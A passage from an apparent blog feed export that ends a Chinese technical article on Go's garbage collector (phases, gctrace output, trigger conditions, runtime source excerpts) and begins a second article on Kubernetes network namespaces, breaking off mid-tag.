运行时<strong>基于只有指针类型的值包含指针</strong>的假设增加了对栈内存的精确扫描支持，实现了真正精确的垃圾收集；将unsafe.Pointer类型转换成整数类型的值认定为不合法的，可能会造成悬挂指针等严重问题；</p><p>v1.5 — 实现了基于<strong>三色标记清扫的并发</strong>垃圾收集器（插入写屏障）：</p><ul><li>大幅度降低垃圾收集的延迟从几百 ms 降低至 10ms 以下；</li><li>计算垃圾收集启动的合适时间并通过并发加速垃圾收集的过程；</li></ul><p>v1.6 — 实现了去中心化的垃圾收集协调器：</p><ul><li>基于显式的状态机使得任意Goroutine都能触发垃圾收集的状态迁移；</li><li>使用密集的位图替代空闲链表表示的堆内存，降低清除阶段的CPU占用;</li></ul><p>v1.7 — 通过<strong>并行栈收缩</strong>将垃圾收集的时间缩短至2ms以内；</p><p>v1.8 — 使用<strong>混合写屏障</strong>将垃圾收集的时间缩短至0.5ms以内；</p><p>v1.9 — 彻底移除暂停程序的重新扫描栈的过程；</p><p>v1.10 — 更新了垃圾收集调频器（Pacer）的实现，分离软硬堆大小的目标；</p><p>v1.12 — 使用<strong>新的标记终止算法</strong>简化垃圾收集器的几个阶段；</p><p>v1.13 — 通过新的 Scavenger 解决瞬时内存占用过高的应用程序向操作系统归还内存的问题；</p><p>v1.14 — 使用全新的页分配器<strong>优化内存分配的速度</strong>；</p><p>v1.15 — 改进编译器和运行时内部的CL 226367，它使编译器可以将更多的x86寄存器用于垃圾收集器的写屏障调用；</p><p>v1.16 — Go runtime默认使用MADV_DONTNEED更积极的将不用的内存释放给OS。</p><h2 id="六、GC过程"><a href="#六、GC过程" class="headerlink" title="六、GC过程"></a><strong>六、GC过程</strong></h2><p>Golang GC 相关的代码在<strong>runtime&#x2F;mgc.go</strong>文件下，可以看见GC总共分为4个阶段(翻译自Golang v1.16版本源码)：</p><p><strong>1.sweep termination（清理终止）</strong></p><ul><li><p>暂停程序，触发STW。所有的P（处理器）都会进入safe-point（安全点）；</p></li><li><p>清理未被清理的 span 。如果当前垃圾收集是强制触发的，需要处理还未被清理的内存管理单元；</p></li></ul><p><strong>2.the mark phase（标记阶段）</strong></p><ul><li>将<strong>GC状态gcphase从_GCoff改成_GCmark</strong>、开启写屏障、启用协助线程（mutator assists）、将根对象入队；</li><li>恢复程序执行，标记进程（mark workers）和协助程序会开始并发标记内存中的对象，写屏障会覆盖的重写指针和新指针（标记成灰色），而所有新创建的对象都会被直接标记成黑色；</li><li>GC执行根节点的标记，这包括扫描所有的栈、全局对象以及不在堆中的运行时数据结构。扫描goroutine栈会导致goroutine停止，并对栈上找到的所有指针加置灰，然后继续执行goroutine；</li><li>GC遍历灰色对象队列，会将灰色对象变成黑色，并将该指针指向的对象置灰；</li><li>由于GC工作分布在本地缓存中，GC会使用分布式终止算法（distributed termination algorithm）来检测何时不再有根标记作业或灰色对象，如果没有了GC会转为mark termination（标记终止）。</li></ul><p><strong>3. mark termination（标记终止）</strong></p><ul><li>STW；</li><li>将GC状态gcphase切换至_GCmarktermination，关闭gc工作线程和协助程序；</li><li>执行housekeeping，例如刷新mcaches。</li></ul><p><strong>4. the sweep phase（清理阶段）</strong></p><ul><li>将GC状态gcphase切换至_GCoff来准备清理阶段，初始化清理阶段并关闭写屏障；</li><li>恢复用户程序，从现在开始，所有新创建的对象会标记成白色；如果有必要，在使用前分配清理spans；</li><li>后台并发清理所有的内存管理类单元。</li></ul><p><strong>GC过程代码示例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">gcfinished</span><span class="hljs-params">()</span></span> *<span class="hljs-type">int</span> &#123;<br>  p := <span class="hljs-number">1</span><br>  runtime.SetFinalizer(&amp;p, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(_ *<span class="hljs-type">int</span>)</span></span> &#123;<br>    <span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;gc finished&quot;</span>)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> &amp;p<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">allocate</span><span class="hljs-params">()</span></span> &#123;<br>  _ = <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-type">int</span>((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">20</span>)*<span class="hljs-number">0.25</span>))<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  f, _ := os.Create(<span class="hljs-string">&quot;trace.out&quot;</span>)<br>  <span class="hljs-keyword">defer</span> f.Close()<br>  trace.Start(f)<br>  <span class="hljs-keyword">defer</span> trace.Stop()<br>  gcfinished()<br>  <span class="hljs-comment">// 当完成 GC 时停止分配</span><br>  <span class="hljs-keyword">for</span> n := <span class="hljs-number">1</span>; n &lt; <span class="hljs-number">50</span>; n++ &#123;<br>    <span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;#allocate: &quot;</span>, n)<br>    allocate()<br>  &#125;<br>  <span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;terminate&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>运行程序</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">hewittwang@HEWITTWANG-MB0 rtx % <span class="hljs-attr">GODEBUG=</span><span class="hljs-attr">gctrace=</span><span class="hljs-number">1</span> go run new1.go  <br>gc <span class="hljs-number">1</span> @<span class="hljs-number">0.015s</span> <span class="hljs-number">0</span>%: <span class="hljs-number">0.015</span>+<span class="hljs-number">0.36</span>+<span class="hljs-number">0.043</span> <span class="hljs-keyword">ms</span> <span class="hljs-title">clock</span>, <span class="hljs-number">0.18</span>+<span class="hljs-number">0.55</span>/<span class="hljs-number">0.64</span>/<span class="hljs-number">0.13</span>+<span class="hljs-number">0.52</span> <span class="hljs-keyword">ms</span> <span class="hljs-title">cpu</span>, <span class="hljs-number">4</span>-&gt;<span class="hljs-number">4</span>-&gt;<span class="hljs-number">0</span> MB, <span class="hljs-number">5</span> MB goal, <span class="hljs-number">12</span> P<br>gc <span class="hljs-number">2</span> @<span class="hljs-number">0.024s</span> <span class="hljs-number">1</span>%: <span class="hljs-number">0.045</span>+<span class="hljs-number">0.19</span>+<span class="hljs-number">0.018</span> <span class="hljs-keyword">ms</span> <span class="hljs-title">clock</span>, <span class="hljs-number">0.54</span>+<span class="hljs-number">0.37</span>/<span class="hljs-number">0.31</span>/<span class="hljs-number">0.041</span>+<span class="hljs-number">0.22</span> <span class="hljs-keyword">ms</span> <span class="hljs-title">cpu</span>, <span class="hljs-number">4</span>-&gt;<span class="hljs-number">4</span>-&gt;<span class="hljs-number">0</span> MB, <span class="hljs-number">5</span> MB goal, <span class="hljs-number">12</span> P<br>....<br></code></pre></td></tr></table></figure><p>栈分析</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">gc <span class="hljs-number">2</span>      : 第一个GC周期<br>@<span class="hljs-number">0.024s</span>   : 从程序开始运行到第一次GC时间为<span class="hljs-number">0.024</span> 秒<br><span class="hljs-number">1</span>%        : 此次GC过程中CPU 占用率<br><br>wall clock<br><span class="hljs-number">0.045</span>+<span class="hljs-number">0.19</span>+<span class="hljs-number">0.018</span> <span class="hljs-keyword">ms</span> <span class="hljs-title">clock</span><br><span class="hljs-number">0.045</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">: STW</span>，Marking <span class="hljs-literal">Start</span>, 开启写屏障<br><span class="hljs-number">0.19</span> <span class="hljs-keyword">ms</span>   <span class="hljs-title">: Marking</span>阶段<br><span class="hljs-number">0.018</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">: STW</span>，Marking终止，关闭写屏障<br><br>CPU time<br><span class="hljs-number">0.54</span>+<span class="hljs-number">0.37</span>/<span class="hljs-number">0.31</span>/<span class="hljs-number">0.041</span>+<span class="hljs-number">0.22</span> <span class="hljs-keyword">ms</span> <span class="hljs-title">cpu</span><br><span class="hljs-number">0.54</span> <span class="hljs-keyword">ms</span>   <span class="hljs-title">: STW</span>，Marking <span class="hljs-literal">Start</span><br><span class="hljs-number">0.37</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">: 辅助标记时间</span><br><span class="hljs-title">0</span>.<span class="hljs-number">31</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">: 并发标记时间</span><br><span class="hljs-title">0</span>.<span class="hljs-number">041</span> <span class="hljs-keyword">ms</span>   <span class="hljs-title">: GC</span> 空闲时间<br><span class="hljs-number">0.22</span> <span class="hljs-keyword">ms</span>   <span class="hljs-title">: Mark</span> 终止时间<br><br><span class="hljs-number">4</span>-&gt;<span class="hljs-number">4</span>-&gt;<span class="hljs-number">0</span> MB， <span class="hljs-number">5</span> MB goal<br><span class="hljs-number">4</span> MB      ：标记开始时，堆大小实际值<br><span class="hljs-number">4</span> MB      ：标记结束时，堆大小实际值<br><span class="hljs-number">0</span> MB      ：标记结束时，标记为存活对象大小<br><span class="hljs-number">5</span> MB      ：标记结束时，堆大小预测值<br><br><span class="hljs-number">12</span> P      ：本次GC过程中使用的goroutine 数量<br></code></pre></td></tr></table></figure><h2 id="七、GC触发条件"><a href="#七、GC触发条件" class="headerlink" title="七、GC触发条件"></a><strong>七、GC触发条件</strong></h2><p>运行时会通过runtime.gcTrigger.test方法决定是否需要触发垃圾收集，当满足触发垃圾收集的基本条件（即满足_GCoff阶段的退出条件）时——允许垃圾收集、程序没有崩溃并且没有处于垃圾收集循环，该方法会根据三种不同方式触发进行不同的检查：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//mgc.go 文件 runtime.gcTrigger.test</span><br> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t gcTrigger)</span></span> test() <span class="hljs-type">bool</span> &#123;<br>    <span class="hljs-comment">//测试是否满足触发垃圾手机的基本条件</span><br>    <span class="hljs-keyword">if</span> !memstats.enablegc || panicking != <span class="hljs-number">0</span> || gcphase != _GCoff &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">switch</span> t.kind &#123;<br>      <span class="hljs-keyword">case</span> gcTriggerHeap:    <span class="hljs-comment">//堆内存的分配达到达控制器计算的触发堆大小</span><br>         <span class="hljs-comment">// Non-atomic access to gcController.heapLive for performance. If</span><br>         <span class="hljs-comment">// we are going to trigger on this, this thread just</span><br>         <span class="hljs-comment">// atomically wrote gcController.heapLive anyway and we&#x27;ll see our</span><br>         <span class="hljs-comment">// own write.</span><br>         <span class="hljs-keyword">return</span> gcController.heapLive &gt;= gcController.trigger<br>      <span class="hljs-keyword">case</span> gcTriggerTime:      <span class="hljs-comment">//如果一定时间内没有触发，就会触发新的循环，该出发条件由 `runtime.forcegcperiod`变量控制，默认为 2 分钟；</span><br>         <span class="hljs-keyword">if</span> gcController.gcPercent &lt; <span class="hljs-number">0</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>        &#125;<br>         lastgc := <span class="hljs-type">int64</span>(atomic.Load64(&amp;memstats.last_gc_nanotime))<br>         <span class="hljs-keyword">return</span> lastgc != <span class="hljs-number">0</span> &amp;&amp; t.now-lastgc &gt; forcegcperiod<br>      <span class="hljs-keyword">case</span> gcTriggerCycle:      <span class="hljs-comment">//如果当前没有开启垃圾收集，则触发新的循环；</span><br>         <span class="hljs-comment">// t.n &gt; work.cycles, but accounting for wraparound.</span><br>         <span class="hljs-keyword">return</span> <span class="hljs-type">int32</span>(t.n-work.cycles) &gt; <span class="hljs-number">0</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br> &#125;<br></code></pre></td></tr></table></figure><p>用于开启垃圾回收的方法为runtime.gcStart，因此所有调用该函数的地方都是触发GC的代码：</p><ul><li>runtime.mallocgc申请内存时根据堆大小触发GC</li><li>runtime.GC用户程序手动触发GC</li><li>runtime.forcegchelper后台运行定时检查触发GC</li></ul><p><strong>（一）申请内存触发runtime.mallocgc</strong></p><p>Go运行时会将堆上的对象按大小分成微对象、小对象和大对象三类，这三类对象的创建都可能会触发新的GC。</p><p>1.当前线程的内存管理单元中不存在空闲空间时，创建微对象(noscan &amp;&amp;size&lt;maxTinySize)和小对象需要调用 runtime.mcache.nextFree从中心缓存或者页堆中获取新的管理单元，这时如果span满了就会导致返回的shouldhelpgc&#x3D;true，就可能触发垃圾收集；</p><p>2.当用户程序申请分配32KB以上的大对象时，一定会构建 runtime.gcTrigger结构体尝试触发垃圾收集。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mallocgc</span><span class="hljs-params">(size <span class="hljs-type">uintptr</span>, typ *_type, needzero <span class="hljs-type">bool</span>)</span></span> unsafe.Pointer &#123;<br>    省略代码 ...<br>    shouldhelpgc := <span class="hljs-literal">false</span>  <br>  dataSize := size<br>  c := getMCache()       <span class="hljs-comment">//尝试获取mCache。如果没启动或者没有P,返回nil；</span><br> <br>    省略代码 ...<br>    <span class="hljs-keyword">if</span> size &lt;= maxSmallSize &#123;  <br>       <span class="hljs-keyword">if</span> noscan &amp;&amp; size &lt; maxTinySize &#123; <span class="hljs-comment">// 微对象分配</span><br>  省略代码 ...<br>          v := nextFreeFast(span)<br>          <span class="hljs-keyword">if</span> v == <span class="hljs-number">0</span> &#123;<br>             v, span, shouldhelpgc = c.nextFree(tinySpanClass)<br>          &#125;<br>      省略代码 ...<br>      &#125; <span class="hljs-keyword">else</span> &#123;      <span class="hljs-comment">//小对象分配</span><br>         省略代码 ...<br>          <span class="hljs-keyword">if</span> v == <span class="hljs-number">0</span> &#123;<br>             v, span, shouldhelpgc = c.nextFree(spc)<br>          &#125;<br>        省略代码 ...<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>       shouldhelpgc = <span class="hljs-literal">true</span><br>       省略代码 ...<br>    &#125;<br>  省略代码 ...<br>    <span class="hljs-keyword">if</span> shouldhelpgc &#123;      <span class="hljs-comment">//是否应该触发gc</span><br>      <span class="hljs-keyword">if</span> t := (gcTrigger&#123;kind: gcTriggerHeap&#125;); t.test() &#123;   <span class="hljs-comment">//如果满足gc触发条件就调用gcStart()</span><br>          gcStart(t)<br>      &#125;<br>    &#125;<br>  省略代码 ...<br>    <span class="hljs-keyword">return</span> x<br> &#125;<br></code></pre></td></tr></table></figure><p>这个时候调用t.test()执行的是gcTriggerHeap情况，只需要判断gcController.heapLive &gt;&#x3D; gcController.trigger的真假就可以了。 heapLive表示垃圾收集中存活对象字节数，trigger表示触发标记的堆内存大小的；当内存中存活的对象字节数大于触发垃圾收集的堆大小时，新一轮的垃圾收集就会开始。</p><p>1.heapLive — 为了减少锁竞争，运行时只会在中心缓存分配或者释放内存管理单元以及在堆上分配大对象时才会更新；</p><p>2.trigger — 在标记终止阶段调用runtime.gcSetTriggerRatio更新触发下一次垃圾收集的堆大小，它能够决定触发垃圾收集的时间以及用户程序和后台处理的标记任务的多少，利用反馈控制的算法根据堆的增长情况和垃圾收集CPU利用率确定触发垃圾收集的时机。</p><p><strong>（二）手动触发runtime.GC</strong></p><p>用户程序会通过runtime.GC函数在程序运行期间主动通知运行时执行，该方法在调用时会阻塞调用方直到当前垃圾收集循环完成，在垃圾收集期间也可能会通过STW暂停整个程序：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">func</span> GC() &#123;<br>    <span class="hljs-regexp">//</span>在正式开始垃圾收集前，运行时需要通过runtime.gcWaitOnMark等待上一个循环的标记终止、标记和清除终止阶段完成；<br>    n := atomic.Load(&amp;work.cycles)<br>    gcWaitOnMark(n)<br> <br>  <span class="hljs-regexp">//</span>调用 `runtime.gcStart` 触发新一轮的垃圾收集<br>    gcStart(gcTrigger&#123;kind: gcTriggerCycle, n: n + <span class="hljs-number">1</span>&#125;)<br> <br>    <span class="hljs-regexp">//</span>`runtime.gcWaitOnMark` 等待该轮垃圾收集的标记终止阶段正常结束；<br>    gcWaitOnMark(n + <span class="hljs-number">1</span>)<br> <br>    <span class="hljs-regexp">//</span> 持续调用 `runtime.sweepone` 清理全部待处理的内存管理单元并等待所有的清理工作完成<br>    <span class="hljs-keyword">for</span> atomic.Load(&amp;work.cycles) == n+<span class="hljs-number">1</span> &amp;&amp; sweepone() != ^uintptr(<span class="hljs-number">0</span>) &#123;<br>        sweep.nbgsweep++<br>        Gosched()  <span class="hljs-regexp">//</span>等待期间会调用 `runtime.Gosched` 让出处理器<br>    &#125;<br> <br>    <span class="hljs-regexp">//</span><br>    <span class="hljs-keyword">for</span> atomic.Load(&amp;work.cycles) == n+<span class="hljs-number">1</span> &amp;&amp; !isSweepDone() &#123;<br>        Gosched()<br>    &#125;<br> <br>    <span class="hljs-regexp">//</span> 完成本轮垃圾收集的清理工作后，通过 `runtime.mProf_PostSweep` 将该阶段的堆内存状态快照发布出来，我们可以获取这时的内存状态<br>    mp := acquirem()<br>    cycle := atomic.Load(&amp;work.cycles)<br>    <span class="hljs-keyword">if</span> cycle == n+<span class="hljs-number">1</span> || (gcphase == _GCmark &amp;&amp; cycle == n+<span class="hljs-number">2</span>) &#123;   <span class="hljs-regexp">//</span>仅限于没有启动其他标记终止过程<br>        mProf_PostSweep()<br>    &#125;<br>    releasem(mp)<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>（三）后台运行定时检查触发runtime.forcegchelper</strong></p><p>运行时会在应用程序启动时在后台开启一个用于强制触发垃圾收集的Goroutine，该Goroutine调用runtime.gcStart尝试启动新一轮的垃圾收集：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// start forcegc helper goroutine</span><br>func <span class="hljs-built_in">init</span>() &#123;<br>   go <span class="hljs-built_in">forcegchelper</span>()<br>&#125;<br> <br>func <span class="hljs-built_in">forcegchelper</span>() &#123;<br>   forcegc<span class="hljs-selector-class">.g</span> = <span class="hljs-built_in">getg</span>()<br>   <span class="hljs-built_in">lockInit</span>(&amp;forcegc<span class="hljs-selector-class">.lock</span>, lockRankForcegc)<br>   <span class="hljs-keyword">for</span> &#123;<br>      <span class="hljs-built_in">lock</span>(&amp;forcegc.lock)<br>      <span class="hljs-keyword">if</span> forcegc<span class="hljs-selector-class">.idle</span> != <span class="hljs-number">0</span> &#123;<br>         <span class="hljs-built_in">throw</span>(<span class="hljs-string">&quot;forcegc: phase error&quot;</span>)<br>      &#125;<br>      atomic<span class="hljs-selector-class">.Store</span>(&amp;forcegc<span class="hljs-selector-class">.idle</span>, <span class="hljs-number">1</span>)<br>      <br>     <span class="hljs-comment">//该 Goroutine 会在循环中调用runtime.goparkunlock主动陷入休眠等待其他 Goroutine 的唤醒</span><br>      <span class="hljs-built_in">goparkunlock</span>(&amp;forcegc<span class="hljs-selector-class">.lock</span>, waitReasonForceGCIdle, traceEvGoBlock, <span class="hljs-number">1</span>)<br>       <br>      <span class="hljs-keyword">if</span> debug<span class="hljs-selector-class">.gctrace</span> &gt; <span class="hljs-number">0</span> &#123;<br>         <span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;GC forced&quot;</span>)<br>      &#125;<br>      <span class="hljs-comment">// Time-triggered, fully concurrent.</span><br>      <span class="hljs-built_in">gcStart</span>(gcTrigger&#123;kind: gcTriggerTime, n<br>      ow: <span class="hljs-built_in">nanotime</span>()&#125;)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="八、问题思考"><a href="#八、问题思考" class="headerlink" title="八、问题思考"></a>八、问题思考</h2><p>1.为什么删除写屏障的时候要原始快照？</p><p>2.删除写屏障出现已扫描黑色对象新增白色对象的怎么处理？</p><p>3.关于内存管理，gc整体流程，go如何将代码转化为二进制？</p><p><strong>参考文献</strong></p><p>  1.《Go语言设计与实现》</p><p>(<a href="https://draveness.me/golang/docs/part3-runtime/ch07-memory/golang-garbage-collector/">https://draveness.me/golang/docs/part3-runtime/ch07-memory/golang-garbage-collector/</a>)</p><p>  2.《一个专家眼中的Go与Java垃圾回收算法大对比》</p><p>(<a href="https://blog.csdn.net/u011277123/article/details/53991572">https://blog.csdn.net/u011277123/article/details/53991572</a>)</p><p>  3.《Go语言问题集》</p><p>(<a href="https://www.bookstack.cn/read/qcrao-Go-Questions/spilt.19.GC-GC.md">https://www.bookstack.cn/read/qcrao-Go-Questions/spilt.19.GC-GC.md</a>)</p><p>   4.《CMS垃圾收集器》</p><p>(<a href="https://juejin.cn/post/6844903782107578382">https://juejin.cn/post/6844903782107578382</a>)</p><p>  5.《Golang v 1.16版本源码》</p><p>(<a href="https://github.com/golang/go">https://github.com/golang/go</a>)</p><p>  6.《Golang—内存管理(内存分配)》</p><p>(<a href="http://t.zoukankan.com/zpcoding-p-13259943.html">http://t.zoukankan.com/zpcoding-p-13259943.html</a>)</p><p>  7.《深入理解Java虚拟机：JVM高级特性与最佳实践（第3版）》—机械工业出版社</p><p>  8.《腾讯妹子图解Golang内存分配和垃圾回收》](<a href="https://mp.weixin.qq.com/s/iAy9ReQhnmCYUFvwYroGPA">https://mp.weixin.qq.com/s/iAy9ReQhnmCYUFvwYroGPA</a>)</p><p>  9.<a href="https://www.yuque.com/aceld/golang/zhzanb">《Golang修养之路》</a></p><ol start="10"><li><p><a href="https://golang.design/under-the-hood/zh-cn/part2runtime/ch08gc/barrier/">https://golang.design/under-the-hood/zh-cn/part2runtime/ch08gc/barrier/</a></p></li><li><p><a href="https://liqingqiya.github.io/golang/gc/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/2020/06/02/gc2.html">https://liqingqiya.github.io/golang/gc/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/2020/06/02/gc2.html</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kubernetes 网络基础</title>
    <link href="/2022/08/27/Kubernetes-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/08/27/Kubernetes-%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"># Kubernetes 网络模型基础github对应地址：https://github.com/longpi1/Reading-notes/blob/main/kuberneters/%E7%BD%91%E7%BB%9C/Kubernetes%20%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E5%9F%BA%E7%A1%80.md## 介绍<p>Kubernetes 是为运行分布式集群而建立的，分布式系统的本质使得网络成为 Kubernetes 的核心和必要组成部分，了解 Kubernetes 网络模型可以使你能够正确运行、监控和排查应用程序故障。</p><p><img src="https://s2.loli.net/2022/08/27/OlUZo4yNiTAPgmC.png" alt="网络模型.png"></p><p>网络是非常复杂的，拥有许多概念，对于不熟悉这个领域的用户来说，这可能会有一定的难度，这里面有很多概念需要理解，并且还需要把这些概念整合起来形成一个连贯的整体，比如网络命名空间、虚拟接口、IP 转发、NAT 等概念。</p><p>Kubernetes 中对任何网络实现都规定了以下的一些要求：</p><ul><li>所有 Pod 都可以在不使用 NAT 的情况下与所有其他 Pod 进行通信</li><li>所有节点都可以在没有 NAT 的情况下与所有 Pod 进行通信</li><li>Pod 自己的 IP 与其他 Pod 看到的 IP 是相同的</li></ul><p>鉴于这些限制，我们需要解决几个不同的网络问题：</p><ol><li>容器到容器的网络</li><li>Pod 到 Pod 的网络</li><li>Pod 到 Service 的网络</li><li>互联网到 Service 的网络</li></ol><p>接下来我们将来讨论这些问题及其解决方案。</p><h2 id="容器到容器网络"><a href="#容器到容器网络" class="headerlink" title="容器到容器网络"></a>容器到容器网络</h2><p>通常情况下我们将虚拟机中的网络通信视为直接与以太网设备进行交互，如图1所示。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/z9BgVMEm7YtugibqBH8vj7OvmDx0O2fwgCV9T9zxQ7pfMHEiauW3V6z9TiaUIrm4TfdVibb5hNJMJO7OticAOK1v6Ng/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>​                                                                                                                <strong>图1.网络设备的理想视图</strong></p><p>实际的情况肯定比这要复杂，在 Linux 中，每个正在运行的进程都在一个网络命名空间内进行通信，该命名空间提供了一个具有自己的路由、防火墙规则和网络设备的逻辑网络栈，从本质上讲，网络命名空间为命名空间内的所有进程提供了一个全新的网络堆栈。</p><p>Linux 用户可以使用 <code>ip</code> 命令创建网络命名空间。例如，以下命令将创建一个名为 ns1 的网络命名空间。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$<span class="hljs-built_in"> ip </span>netns <span class="hljs-built_in">add</span> ns1 <br></code></pre></td></tr></table></figure><p>命名空间创建后，会在 <code>/var/run/netns</code> 下面为其创建一个挂载点，即使没有附加任何进程，命名空间也是可以保留的。</p><p>你可以通过列出 <code>/var/run/netns</code> 下的所有挂载点或使用 <code>ip</code> 命令来列出可用的命名空间。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span> /var/run/netns</span><br>ns1<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ip netns</span><br>ns1<br></code></pre></td></tr></table></figure><p>默认情况下，Linux 将为每个进程分配到 root network namespace，以提供访问外部的能力，如图2所示。</p><p><img 